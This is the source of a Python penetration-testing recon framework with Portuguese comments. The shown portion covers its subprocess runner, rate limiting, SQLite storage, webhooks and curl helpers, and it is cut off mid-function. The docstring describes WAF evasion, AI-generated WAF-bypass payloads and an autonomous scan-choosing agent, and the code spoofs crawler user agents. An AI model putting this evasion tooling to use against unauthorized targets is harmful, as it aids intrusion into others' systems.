#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RECON.PY — Full Automated Reconnaissance Framework v6.0 (Python)
⚠  USE APENAS EM SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA ⚠

Novidades v6.0 (sobre v5.0) — Melhorias de Robustez e Escalabilidade:
  CORREÇÕES CRÍTICAS
  - FIX: Race condition em cfg._rate_429_count/_rate_backoff — agora protegido por Lock
  - FIX: except Exception: pass substituído por exceções específicas com logging
  - FIX: Circuit Breaker — módulo desabilitado após 3 falhas consecutivas
  - FIX: waf_ai_bypass() integrado ao fluxo XSS/SQLi com cache por tipo de WAF

  MELHORIAS ARQUITETURAIS
  - NOVO: ToolRunner — centraliza subprocess calls (erros, logging, ANSI strip)
  - NOVO: CircuitBreaker — evita loops de falha silenciosa em módulos quebrados
  - NOVO: url_signature() + deduplicate_by_signature() — reduz ~80% de URLs redundantes
  - NOVO: step_initial_health_check() — valida API, binários e permissões antes de rodar
  - NOVO: Cache de respostas WAF AI Bypass — não repaga pela mesma sugestão da IA

  v5.0 (mantidos):
  - OODA Agent, Playwright, Webhooks, WAF AI Bypass, Async SQLite Queue
  - Cloud Recon S3/GCS/Azure/K8s/Docker, PoC Generator, Credential Leak
  - Executive Summary AI, Whitelist/Safe Mode, Dry-run, GPG encryption
  - Per-host rate limiting, Health Check, Live Dashboard

Uso: python3 recon.py <dominio> [opções]
     python3 recon.py alvo.com
     python3 recon.py alvo.com --threads 200 --deep
     python3 recon.py alvo.com --plan --agent              # IA decide os scans
     python3 recon.py alvo.com --playwright                # crawl SPA real
     python3 recon.py alvo.com --webhook-url https://hooks.slack.com/...
     python3 recon.py alvo.com --whitelist alvo.com --dry-run
     python3 recon.py alvo.com --encrypt-output --encrypt-pass MinhaS3nha
     python3 recon.py --install
     python3 recon.py alvo.com --watch --watch-interval 3600

  v5.0 detalhado:
  BUGFIXES CRÍTICOS
  - BUGFIX: Exceções específicas em vez de `except Exception: pass` cego
  - BUGFIX: Exaustão de threads — host_throttle não bloqueia mais o ThreadPoolExecutor
  - BUGFIX: Vazamento de memória em subprocess — nuclei/dalfox/ffuf escrevem direto no disco
  - BUGFIX: Race condition SQLite — fila (Queue) com worker dedicado para INSERTs
  - BUGFIX: Falsos positivos reduzidos — validação de contexto HTTP em SQLi/LFI

  MELHORIAS ESTRUTURAIS
  - NOVO: .env / RECON_WORDLIST — caminhos de wordlists configuráveis (sem hardcode)
  - NOVO: Webhooks nativos (Discord/Slack/Telegram) — alertas em tempo real por finding
  - MELHORIA: subprocess de ferramentas pesadas com saída direto ao disco

  INTELIGÊNCIA E AGENTES
  - NOVO: --agent — Agente OODA com Function Calling (API Anthropic tools)
            A IA recebe contexto pós-recon e decide quais módulos executar
  - NOVO: waf_ai_bypass() — ao receber 403, pede à IA 3 variações de bypass
  - NOVO: --playwright — Crawling headless real (React/Vue/Angular/SPAs)
            Captura requests AJAX/Fetch e injeta em params_alive.txt

  v4.0 (mantidos):
  - Cloud Recon S3/GCS/Azure/K8s/Docker
  - PoC Generator, Credential Leak (HIBP), Executive Summary AI
  - Whitelist/Safe Mode, Dry-run, GPG encryption
  - Per-host rate limiting, Health Check, Live Dashboard

  v3.0 (mantidos):
  - XSS deadline por URL, wafw00f sem ANSI, Ctrl+C cleanup
  - Technology Profiler, AI Attack Planner, Payload Feedback Loop
  - SQLite Persistence, 403 Bypass, Metadata Harvesting
  - HTML Report, Watcher Mode, JS Secret Validation, GF patterns
"""

import argparse
import base64
import concurrent.futures
import glob
import hashlib
import http.server
import json
import os
import platform
import queue
import random
import re
import shutil
import signal
import socketserver
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from collections import Counter, defaultdict
from contextlib import contextmanager
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# ─────────────────────────────────────────────────────────────────────────────
# CORES ANSI
# ─────────────────────────────────────────────────────────────────────────────
RED      = '\033[0;31m'
LRED     = '\033[1;31m'
GREEN    = '\033[0;32m'
LGREEN   = '\033[1;32m'
YELLOW   = '\033[1;33m'
BLUE     = '\033[0;34m'
LBLUE    = '\033[1;34m'
MAGENTA  = '\033[0;35m'
LMAGENTA = '\033[1;35m'
CYAN     = '\033[0;36m'
LCYAN    = '\033[1;36m'
WHITE    = '\033[1;37m'
GRAY     = '\033[0;37m'
BOLD     = '\033[1m'
DIM      = '\033[2m'
NC       = '\033[0m'

ANSI_RE = re.compile(r'\x1b\[[0-9;]*[mGKHF]|\x1b\(B|\x1b=')

def strip_ansi(s: str) -> str:
    return ANSI_RE.sub('', s)


# ─────────────────────────────────────────────────────────────────────────────
# v6 — TOOLRUNNER: Centraliza subprocess com logging, ANSI strip e erros
# ─────────────────────────────────────────────────────────────────────────────
class ToolRunner:
    """
    Executa ferramentas externas de forma padronizada.
    Centraliza: logging de erros, strip de ANSI, timeout, escrita em disco.
    Elimina código duplicado de subprocess por todo o script.
    """

    def run(self, name: str, cmd: List[str], timeout: int = 300,
            input_data: Optional[str] = None,
            write_to: Optional[str] = None) -> Tuple[int, str, str]:
        """
        Executa cmd e retorna (returncode, stdout, stderr).
        Se write_to for definido, stdout vai direto ao arquivo (economiza memória).
        """
        if cfg.dry_run:
            log_err(f"[DRY-RUN] ToolRunner.run({name}): {' '.join(cmd[:4])}...")
            return 0, f"[DRY-RUN] {name}", ""

        try:
            if write_to:
                with open(write_to, 'w') as fout:
                    proc = subprocess.Popen(
                        cmd,
                        stdin=subprocess.PIPE if input_data else None,
                        stdout=fout,
                        stderr=subprocess.DEVNULL,
                        start_new_session=True,
                    )
                    with _child_lock:
                        _child_pids.add(proc.pid)
                    try:
                        proc.communicate(
                            input=input_data.encode(errors='replace') if input_data else None,
                            timeout=timeout
                        )
                        return proc.returncode, '', ''
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.communicate()
                        log_err(f"{name}: timeout {timeout}s")
                        return -1, '', 'timeout'
                    finally:
                        with _child_lock:
                            _child_pids.discard(proc.pid)
            else:
                kwargs: dict = {'capture_output': True, 'text': True,
                                'timeout': timeout, 'errors': 'replace'}
                if input_data is not None:
                    kwargs['input'] = input_data
                r = subprocess.run(cmd, **kwargs)
                return r.returncode, strip_ansi(r.stdout or ''), strip_ansi(r.stderr or '')

        except FileNotFoundError:
            log_err(f"{name}: binário não encontrado — '{cmd[0]}'")
            return -2, '', 'not found'
        except subprocess.TimeoutExpired:
            log_err(f"{name}: timeout após {timeout}s")
            return -1, '', 'timeout'
        except OSError as e:
            log_err(f"{name}: OSError — {e}")
            return -3, '', str(e)
        except subprocess.SubprocessError as e:
            log_err(f"{name}: SubprocessError — {e}")
            return -4, '', str(e)
        except ValueError as e:
            log_err(f"{name}: ValueError — {e}")
            return -5, '', str(e)


tool_runner = ToolRunner()


# ─────────────────────────────────────────────────────────────────────────────
# v6 — CIRCUIT BREAKER: Desabilita módulos com falhas consecutivas
# ─────────────────────────────────────────────────────────────────────────────
class CircuitBreaker:
    """
    Padrão Circuit Breaker para módulos de scan.
    Após max_failures falhas consecutivas, abre o circuito e desabilita o módulo.
    Evita loops de falha silenciosa que geram relatórios vazios enganosos.
    """

    def __init__(self, max_failures: int = 3):
        self.max_failures = max_failures
        self._failures: Dict[str, int] = {}
        self._open: Set[str] = set()
        self._lock = threading.Lock()

    def record_failure(self, module: str) -> None:
        with self._lock:
            self._failures[module] = self._failures.get(module, 0) + 1
            count = self._failures[module]
            if count >= self.max_failures and module not in self._open:
                self._open.add(module)
                error(f"⚡ CIRCUIT BREAKER ABERTO: módulo '{module}' desabilitado "
                      f"após {self.max_failures} falhas consecutivas!")

    def record_success(self, module: str) -> None:
        with self._lock:
            self._failures.pop(module, None)
            self._open.discard(module)

    def is_open(self, module: str) -> bool:
        with self._lock:
            return module in self._open

    def allow(self, module: str) -> bool:
        """Retorna True se o módulo pode executar. False = circuito aberto."""
        if self.is_open(module):
            warn(f"Circuit breaker: módulo '{module}' está desabilitado — pulando")
            return False
        return True


circuit_breaker = CircuitBreaker(max_failures=3)
# ─────────────────────────────────────────────────────────────────────────────
def send_webhook(title: str, body: str, severity: str = "info"):
    """
    Dispara notificação via webhook no momento da descoberta.
    Compatível com Discord (embeds) e Slack/Telegram (payload simples).
    """
    if not cfg.webhook_url:
        return
    color_map = {"critical": 15158332, "high": 15105570, "medium": 16776960,
                 "info": 3447003, "low": 3066993}
    color = color_map.get(severity, 3447003)
    # Tenta Discord embed; cai para payload simples em caso de erro
    discord_payload = json.dumps({
        "embeds": [{
            "title": f"[RECON v5 — {severity.upper()}] {title}",
            "description": body[:1800],
            "color": color,
            "footer": {"text": f"Alvo: {cfg.domain}"},
            "timestamp": datetime.utcnow().isoformat() + "Z",
        }]
    }).encode()
    try:
        req = urllib.request.Request(
            cfg.webhook_url,
            data=discord_payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=8)
    except urllib.error.HTTPError as e:
        # Slack/Telegram: tenta payload simples
        if e.code not in (400, 404):
            simple = json.dumps({"text": f"[{severity.upper()}] {title}\n{body[:800]}"}).encode()
            try:
                req2 = urllib.request.Request(
                    cfg.webhook_url, data=simple,
                    headers={"Content-Type": "application/json"}, method="POST"
                )
                urllib.request.urlopen(req2, timeout=8)
            except urllib.error.HTTPError as e2:
                # v6 FIX: loga em vez de silenciar — facilita diagnóstico de URL errada
                log_err(f"send_webhook fallback HTTP {e2.code}: {title}")
            except OSError as e2:
                log_err(f"send_webhook fallback OSError: {e2}")
    except OSError:
        pass  # offline ou URL inválida — não interrompe o scan


# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Config:
    # Core
    domain: str = ""
    threads: int = 100
    deep_mode: bool = False
    skip_scans: bool = False
    skip_screenshots: bool = False
    verbose: bool = False
    timeout: int = 10
    rate_limit: int = 50
    max_sqli: int = 30
    max_dalfox_workers: int = 30
    gau_threads: int = 10
    katana_depth: int = 3
    scan_start: float = 0.0
    anthropic_api_key: str = ""
    # Retry / evasion
    max_retries: int = 3
    retry_delay: float = 1.0
    jitter_mode: bool = False
    waf_evasion: bool = True
    install_mode: bool = False
    # Limits
    limit_cors: int = 50
    limit_headers: int = 30
    limit_sensitive: int = 20
    limit_lfi: int = 30
    limit_redirect: int = 30
    limit_js_endpoints: int = 100
    limit_js_secrets: int = 50
    limit_ffuf: int = 20
    limit_arjun: int = 20
    limit_idor: int = 30
    limit_crlf: int = 30
    limit_xss_manual: int = 50
    limit_waf: int = 20
    curl_delay: float = 0.0
    # v3 limits
    limit_403bypass: int = 30
    limit_metadata: int = 20
    xss_url_deadline: int = 45   # segundos por URL no XSS manual
    # Intelligence
    shodan_api_key: str = ""
    adaptive_mode: bool = True
    scan_profile: str = "normal"
    endpoint_scoring: bool = True
    passive_intel: bool = True
    noise_reduction: bool = True
    burst_pause: float = 0.0
    # v3 features
    ai_plan_mode: bool = False
    watcher_mode: bool = False
    watch_interval: int = 3600
    sqlite_db: str = ""
    delta_mode: bool = False
    validate_secrets: bool = True
    # Rate feedback (global)
    rate_feedback: bool = True
    _rate_429_count: int = 0
    _rate_backoff: float = 0.0
    # v4 — Per-host rate limiting
    _host_429: Dict[str, int] = field(default_factory=dict)
    _host_backoff: Dict[str, float] = field(default_factory=dict)
    _host_lock: object = field(default_factory=threading.Lock)
    # v4 — Segurança / ética
    whitelist: List[str] = field(default_factory=list)   # domínios permitidos
    dry_run: bool = False                                  # simula sem enviar requests
    encrypt_output: bool = False                           # criptografa outputs sensíveis
    encrypt_password: str = ""                             # senha para criptografia
    # v4 — Integrações extras
    hibp_api_key: str = ""                                 # HaveIBeenPwned API key
    # v5 — Novas flags
    webhook_url: str = ""                                  # Discord/Slack/Telegram webhook
    agent_mode: bool = False                               # Agente OODA com function calling
    playwright_mode: bool = False                          # Crawl headless para SPAs
    wordlist_path: str = ""                                # Wordlist configurável via .env
    # Tool flags
    has_gowitness: bool = False
    has_naabu: bool = False
    has_subzy: bool = False
    has_arjun: bool = False
    has_ffuf: bool = False
    has_trufflehog: bool = False
    has_assetfinder: bool = False
    has_amass: bool = False
    has_findomain: bool = False
    has_ghauri: bool = False
    has_wafw00f: bool = False
    has_interactsh: bool = False
    has_exiftool: bool = False
    has_gpg: bool = False
    waf_detected: bool = False
    # Tech profile (v3)
    tech_php: bool = False
    tech_nodejs: bool = False
    tech_java: bool = False
    tech_dotnet: bool = False
    tech_python: bool = False
    tech_ruby: bool = False
    tech_apache: bool = False
    tech_nginx: bool = False
    tech_iis: bool = False
    tech_wordpress: bool = False
    tech_graphql: bool = False
    tech_aws: bool = False
    # Directories
    scan_dir: str = ""
    dir_root: str = ""
    dir_disc: str = ""
    dir_urls: str = ""
    dir_params: str = ""
    dir_vulns: str = ""
    dir_scans: str = ""
    dir_shots: str = ""
    dir_js: str = ""
    dir_extra: str = ""
    dir_report: str = ""
    log_file: str = ""
    error_log: str = ""


cfg = Config()
_trap_fired = False
_log_lock = threading.Lock()
_child_pids: Set[int] = set()
_child_lock = threading.Lock()

# Payload feedback: track which payload patterns get 403 (per attack type)
_blocked_payloads: Dict[str, Set[str]] = defaultdict(set)
_blocked_lock = threading.Lock()

# v6: Lock dedicado para contadores de rate (evita race condition em _rate_429_count/_rate_backoff)
_counters_lock = threading.Lock()

# v6: Cache de respostas WAF AI Bypass — evita chamadas repetidas à API para o mesmo tipo de WAF
_waf_bypass_cache: Dict[str, List[str]] = {}
_waf_bypass_lock = threading.Lock()

# ── v5: SQLite queue worker — evita race conditions em alta concorrência ──────
_db_queue: queue.Queue = queue.Queue()
_db_worker_thread: Optional[threading.Thread] = None
_db_worker_stop = threading.Event()


def _db_worker_loop():
    """Thread dedicada: consome a fila e executa INSERTs no SQLite."""
    while not _db_worker_stop.is_set() or not _db_queue.empty():
        try:
            task = _db_queue.get(timeout=1.0)
            if task is None:
                break
            sql, params = task
            try:
                with _db_conn() as con:
                    con.execute(sql, params)
            except Exception as exc:
                log_err(f"db_worker INSERT falhou: {exc}")
            finally:
                _db_queue.task_done()
        except queue.Empty:
            continue


def _start_db_worker():
    global _db_worker_thread
    _db_worker_stop.clear()
    _db_worker_thread = threading.Thread(target=_db_worker_loop, daemon=True, name="db-worker")
    _db_worker_thread.start()


def _stop_db_worker():
    _db_worker_stop.set()
    _db_queue.put(None)  # sentinela para desbloquear o get()
    if _db_worker_thread:
        _db_worker_thread.join(timeout=5)


# ── v5: .env loader — wordlists e paths configuráveis sem hardcode ────────────
def _load_dotenv():
    """Lê .env na pasta atual e exporta variáveis para os.environ."""
    for dotenv_path in ['.env', os.path.expanduser('~/.recon.env')]:
        if os.path.exists(dotenv_path):
            try:
                with open(dotenv_path) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#') and '=' in line:
                            k, _, v = line.partition('=')
                            os.environ.setdefault(k.strip(), v.strip().strip('"\''))
            except OSError:
                pass


# ─────────────────────────────────────────────────────────────────────────────
# SIGNAL TRAP — mata todos os filhos
# ─────────────────────────────────────────────────────────────────────────────
def cleanup_trap(signum=None, frame=None):
    global _trap_fired
    if _trap_fired:
        return
    _trap_fired = True
    print(f"\n{YELLOW}[{_ts()}] ⚠ Sinal recebido — encerrando e matando processos filhos...{NC}")
    with _child_lock:
        for pid in list(_child_pids):
            try:
                os.killpg(os.getpgid(pid), signal.SIGTERM)
            except Exception:
                try:
                    os.kill(pid, signal.SIGTERM)
                except Exception:
                    pass
    if cfg.scan_dir and os.path.isdir(cfg.scan_dir):
        print(f"{YELLOW}[{_ts()}] ⚠ Outputs parciais preservados em: {cfg.scan_dir}{NC}")
    sys.exit(130)

signal.signal(signal.SIGINT, cleanup_trap)
signal.signal(signal.SIGTERM, cleanup_trap)


# ─────────────────────────────────────────────────────────────────────────────
# LOGGER
# ─────────────────────────────────────────────────────────────────────────────
def _ts() -> str:
    return datetime.now().strftime('%H:%M:%S')

def _write_log(raw: str):
    if cfg.log_file:
        try:
            with open(cfg.log_file, 'a') as f:
                f.write(raw + '\n')
        except OSError as e:
            # v6 FIX: não silencia — imprime no stderr sem travar o scan
            print(f"[LOG-ERROR] Falha ao escrever em {cfg.log_file}: {e}", file=sys.stderr)

def log(msg: str):
    line = f"{CYAN}[{_ts()}]{NC} {WHITE}{msg}{NC}"
    with _log_lock:
        print(line)
        _write_log(f"[{_ts()}] {msg}")

def success(msg: str):
    line = f"{LGREEN}[{_ts()}] ✔{NC} {GREEN}{msg}{NC}"
    with _log_lock:
        print(line)
        _write_log(f"[{_ts()}] OK: {msg}")

def warn(msg: str):
    line = f"{YELLOW}[{_ts()}] ⚠{NC} {YELLOW}{msg}{NC}"
    with _log_lock:
        print(line)
        _write_log(f"[{_ts()}] WARN: {msg}")

def error(msg: str):
    line = f"{LRED}[{_ts()}] ✘{NC} {RED}{msg}{NC}"
    with _log_lock:
        print(line)
        _write_log(f"[{_ts()}] ERR: {msg}")

def info(msg: str):
    line = f"{LBLUE}[{_ts()}] ℹ{NC} {BLUE}{msg}{NC}"
    with _log_lock:
        print(line)
        _write_log(f"[{_ts()}] INFO: {msg}")

def log_err(msg: str):
    if cfg.error_log:
        try:
            with open(cfg.error_log, 'a') as f:
                f.write(f"[{_ts()}] {msg}\n")
        except Exception:
            pass

def section(title: str):
    sep = f"{LMAGENTA}[{_ts()}] ══════════════════════════════════════{NC}"
    print()
    print(sep)
    print(f"{LMAGENTA}[{_ts()}]  {title}{NC}")
    print(sep)
    _write_log(f"\n=== {title} ===")


# ─────────────────────────────────────────────────────────────────────────────
# FILE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def count_lines(path: str) -> int:
    try:
        with open(path) as f:
            return sum(1 for l in f if l.strip())
    except Exception:
        return 0

def is_empty(path: str) -> bool:
    return count_lines(path) == 0

def safe_read(path: str) -> List[str]:
    try:
        with open(path) as f:
            return [l.rstrip('\n') for l in f if l.strip()]
    except Exception:
        return []

def touch(path: str):
    Path(path).touch()

def append_line(path: str, line: str):
    with open(path, 'a') as f:
        f.write(line + '\n')

def read_head(path: str, n: int) -> List[str]:
    return safe_read(path)[:n]

def sort_unique_file(path: str):
    lines = safe_read(path)
    lines = sorted(set(lines))
    with open(path, 'w') as f:
        f.write('\n'.join(lines) + ('\n' if lines else ''))


# ─────────────────────────────────────────────────────────────────────────────
# SQLITE PERSISTENCE (v4 — context manager para evitar conexões soltas)
# ─────────────────────────────────────────────────────────────────────────────
@contextmanager
def _db_conn():
    """Context manager para conexões SQLite — garante fechamento em alta concorrência."""
    db_path = cfg.sqlite_db or os.path.expanduser(f"~/.recon_{cfg.domain.replace('.','_')}.db")
    con = sqlite3.connect(db_path, timeout=30, check_same_thread=False)
    con.execute("PRAGMA journal_mode=WAL")   # WAL: múltiplos readers, sem deadlock
    con.execute("PRAGMA busy_timeout=10000")
    try:
        yield con
        con.commit()
    except Exception:
        con.rollback()
        raise
    finally:
        con.close()


def db_init():
    """Inicializa banco SQLite persistente entre scans."""
    db_path = cfg.sqlite_db or os.path.expanduser(f"~/.recon_{cfg.domain.replace('.','_')}.db")
    cfg.sqlite_db = db_path
    with _db_conn() as con:
        con.executescript("""
            CREATE TABLE IF NOT EXISTS subdomains
                (domain TEXT, subdomain TEXT, first_seen TEXT, last_seen TEXT,
                 PRIMARY KEY(domain, subdomain));
            CREATE TABLE IF NOT EXISTS vulns
                (domain TEXT, type TEXT, url TEXT, payload TEXT, severity TEXT,
                 first_seen TEXT, last_seen TEXT,
                 PRIMARY KEY(domain, type, url));
            CREATE TABLE IF NOT EXISTS blocked_ips
                (ip TEXT, target TEXT, blocked_at TEXT,
                 PRIMARY KEY(ip, target));
            CREATE TABLE IF NOT EXISTS scan_history
                (domain TEXT, scan_dir TEXT, started_at TEXT, finished_at TEXT,
                 total_findings INTEGER);
        """)
    info(f"SQLite DB (WAL): {db_path}")

def db_save_subdomain(sub: str):
    # v5: enfileira o INSERT — worker dedicado executa sem race condition
    try:
        now = datetime.now().isoformat()
        _db_queue.put((
            "INSERT INTO subdomains(domain,subdomain,first_seen,last_seen) VALUES(?,?,?,?) "
            "ON CONFLICT(domain,subdomain) DO UPDATE SET last_seen=?",
            (cfg.domain, sub, now, now, now)
        ))
    except Exception as exc:
        log_err(f"db_save_subdomain enqueue: {exc}")

def db_save_vuln(vtype: str, url: str, payload: str = "", severity: str = "medium"):
    # v5: enfileira o INSERT — sem bloqueio no thread de scan
    try:
        now = datetime.now().isoformat()
        _db_queue.put((
            "INSERT INTO vulns(domain,type,url,payload,severity,first_seen,last_seen) VALUES(?,?,?,?,?,?,?) "
            "ON CONFLICT(domain,type,url) DO UPDATE SET last_seen=?,payload=?",
            (cfg.domain, vtype, url, payload, severity, now, now, now, payload)
        ))
    except Exception as exc:
        log_err(f"db_save_vuln enqueue: {exc}")

def db_get_known_subdomains() -> Set[str]:
    try:
        with _db_conn() as con:
            rows = con.execute("SELECT subdomain FROM subdomains WHERE domain=?", (cfg.domain,)).fetchall()
        return {r[0] for r in rows}
    except Exception:
        return set()

def db_get_new_subdomains(current: List[str]) -> List[str]:
    """Retorna apenas subdomínios que não existiam no último scan."""
    known = db_get_known_subdomains()
    return [s for s in current if s not in known]


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD FEEDBACK LOOP (v3)
# ─────────────────────────────────────────────────────────────────────────────
def record_blocked(attack_type: str, payload: str):
    """Registra payload bloqueado (recebeu 403)."""
    key = _payload_key(payload)
    with _blocked_lock:
        _blocked_payloads[attack_type].add(key)

def is_blocked(attack_type: str, payload: str) -> bool:
    """Verifica se payload similar já foi bloqueado."""
    key = _payload_key(payload)
    with _blocked_lock:
        return key in _blocked_payloads.get(attack_type, set())

def _payload_key(payload: str) -> str:
    """Gera chave de similaridade (primeiros 15 chars normalizados)."""
    return re.sub(r'[0-9]+', 'N', payload[:15].lower())

def feedback_hook(attack_type: str, payload: str, status: int, url: str = ""):
    """Chama após cada request para aprender e ajustar rate. v4: per-host tracking."""
    if status == 403:
        record_blocked(attack_type, payload)
    # v6: Lock em contadores globais — evita race condition com GIL
    if status == 429 and cfg.rate_feedback:
        with _counters_lock:
            cfg._rate_429_count += 1
            cfg._rate_backoff = min(cfg._rate_backoff + 1.0, 10.0)
            count_snap = cfg._rate_429_count
        if count_snap % 5 == 0:
            warn(f"Rate limit (429) detectado {count_snap}x — backoff global={cfg._rate_backoff:.1f}s")
    elif status in (200, 201, 301, 302) and cfg._rate_backoff > 0:
        with _counters_lock:
            cfg._rate_backoff = max(cfg._rate_backoff - 0.1, 0.0)

    # v4: Per-host rate limiting — só reduz velocidade no host problemático
    if url:
        try:
            parsed = urllib.parse.urlparse(url)
            host = parsed.netloc
            if host:
                with cfg._host_lock:
                    if status == 429:
                        cfg._host_429[host] = cfg._host_429.get(host, 0) + 1
                        cfg._host_backoff[host] = min(
                            cfg._host_backoff.get(host, 0.0) + 1.5, 15.0
                        )
                        if cfg._host_429[host] % 3 == 0:
                            warn(f"Rate limit por host ({host}): "
                                 f"{cfg._host_429[host]}x → backoff={cfg._host_backoff[host]:.1f}s")
                    elif status in (200, 201, 301, 302):
                        if cfg._host_backoff.get(host, 0) > 0:
                            cfg._host_backoff[host] = max(
                                cfg._host_backoff[host] - 0.2, 0.0
                            )
        except Exception:
            pass


def host_throttle(url: str):
    """
    v5 FIX: aplica backoff específico do host.
    Usa time.sleep() em thread própria — não bloqueia o executor inteiro
    porque cada worker de IO já está em sua própria thread no ThreadPoolExecutor.
    """
    try:
        host = urllib.parse.urlparse(url).netloc
        if host:
            with cfg._host_lock:
                backoff = cfg._host_backoff.get(host, 0.0)
            if backoff > 0:
                time.sleep(min(backoff, 15.0))  # cap de 15s por segurança
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# HTTP / CURL HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def random_ua() -> str:
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile Safari/604.1",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    ]
    return random.choice(uas)

def jitter():
    if cfg.jitter_mode or cfg.waf_detected:
        ms = random.randint(80, 430) / 1000
        time.sleep(ms)
    # v6 FIX: leitura de _rate_backoff protegida por lock — evita race condition
    with _counters_lock:
        backoff_snap = cfg._rate_backoff
    if backoff_snap > 0:
        time.sleep(backoff_snap)

def burst_sleep():
    if cfg.burst_pause > 0:
        time.sleep(cfg.burst_pause)

def curl_throttle():
    if cfg.curl_delay > 0:
        time.sleep(cfg.curl_delay)

def _tracked_run(cmd: List[str], **kwargs):
    """subprocess.run com rastreamento de PID para limpeza em Ctrl+C."""
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
        **{k: v for k, v in kwargs.items() if k not in ('capture_output','check','input','timeout')}
    )
    with _child_lock:
        _child_pids.add(proc.pid)
    try:
        timeout = kwargs.get('timeout')
        # v6 FIX: resolve stdin corretamente — None quando não fornecido,
        # bytes quando string, bytes passados direto. Evita travar ferramentas
        # que não esperam stdin com b'' vazio.
        raw_input = kwargs.get('input')
        if raw_input is None:
            stdin_data = None
        elif isinstance(raw_input, str):
            stdin_data = raw_input.encode(errors='replace')
        else:
            stdin_data = raw_input
        out, err = proc.communicate(input=stdin_data, timeout=timeout)
        ret = proc.returncode
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.communicate()
        raise
    finally:
        with _child_lock:
            _child_pids.discard(proc.pid)
    # Simula CompletedProcess
    class _Res:
        pass
    r = _Res()
    r.returncode = ret
    r.stdout = out.decode(errors='replace') if isinstance(out, bytes) else (out or '')
    r.stderr = err.decode(errors='replace') if isinstance(err, bytes) else (err or '')
    return r

def _build_curl_cmd(url: str, head_only=False, extra_headers=None,
                    method='GET', data=None, follow=False) -> List[str]:
    cmd = ['curl', '-sk', '--max-time', str(cfg.timeout), '-A', random_ua()]
    if head_only:
        cmd.append('-I')
    if follow:
        cmd.append('-L')
    if method.upper() == 'POST':
        cmd.extend(['-X', 'POST'])
    if data:
        cmd.extend(['-d', data])
    for k, v in (extra_headers or {}).items():
        cmd.extend(['-H', f'{k}: {v}'])
    cmd.extend(['-w', '\n__S__%{http_code}__', url])
    return cmd

def retry_curl(url: str, head_only=False, extra_headers=None,
               method='GET', data=None, follow=False) -> Tuple[int, str]:
    # v4: dry-run — não envia requests reais
    if cfg.dry_run:
        return 200, f"[DRY-RUN] {url}"
    host_throttle(url)
    wait = cfg.retry_delay
    for attempt in range(cfg.max_retries):
        cmd = _build_curl_cmd(url, head_only=head_only, extra_headers=extra_headers,
                               method=method, data=data, follow=follow)
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=cfg.timeout + 5, errors='replace')
            out = r.stdout
            if '__S__' in out:
                body, _, rest = out.rpartition('\n__S__')
                status_str = rest.replace('__', '').strip()
                if status_str.isdigit():
                    code = int(status_str)
                    feedback_hook('http', '', code, url=url)
                    return code, body
        except subprocess.TimeoutExpired:
            log_err(f"retry_curl timeout attempt {attempt+1} — {url}")
        except subprocess.SubprocessError as e:
            log_err(f"retry_curl subprocess error attempt {attempt+1} — {url}: {e}")
        except OSError as e:
            log_err(f"retry_curl OS error attempt {attempt+1} — {url}: {e}")
        except ValueError as e:
            log_err(f"retry_curl value error attempt {attempt+1} — {url}: {e}")
        if attempt < cfg.max_retries - 1:
            time.sleep(wait)
            wait *= 2
            jitter()
    log_err(f"retry_curl FINAL FAILURE after {cfg.max_retries} tries for {url}")
    return 0, ""

def cfetch(url: str) -> Tuple[int, str]:
    return retry_curl(url)

def cfetch_headers(url: str) -> Tuple[int, str]:
    return retry_curl(url, head_only=True)


# ─────────────────────────────────────────────────────────────────────────────
# v6 — URL SIGNATURE DEDUPLICATION
# ─────────────────────────────────────────────────────────────────────────────
def url_signature(url: str) -> str:
    """
    Gera assinatura canônica de URL: host + path + nomes dos parâmetros (sem valores).
    Ex: target.com/page.php?id=1  e  target.com/page.php?id=99  → mesma assinatura.
    Permite reduzir ~80% de URLs redundantes em sites dinâmicos.
    """
    try:
        p = urllib.parse.urlparse(url)
        param_names = sorted(urllib.parse.parse_qs(p.query, keep_blank_values=True).keys())
        return f"{p.netloc}{p.path}?{'&'.join(name + '=X' for name in param_names)}"
    except Exception:
        return url


def deduplicate_by_signature(urls: List[str]) -> List[str]:
    """
    Retorna no máximo uma URL por assinatura semântica.
    Preserva a primeira ocorrência de cada assinatura única.
    """
    seen: Dict[str, str] = {}
    for url in urls:
        sig = url_signature(url)
        if sig not in seen:
            seen[sig] = url
    result = list(seen.values())
    if len(result) < len(urls):
        info(f"Deduplicação: {len(urls)} → {len(result)} URLs únicas por assinatura "
             f"(−{len(urls) - len(result)} redundantes)")
    return result


# ─────────────────────────────────────────────────────────────────────────────
# INJECT PER PARAM
# ─────────────────────────────────────────────────────────────────────────────
def inject_per_param(url: str, payload: str) -> List[str]:
    if '?' not in url:
        return [url]
    base, qs = url.split('?', 1)
    params = qs.split('&')
    results = []
    for i, p in enumerate(params):
        if '=' not in p:
            continue
        cur_name = p.split('=')[0]
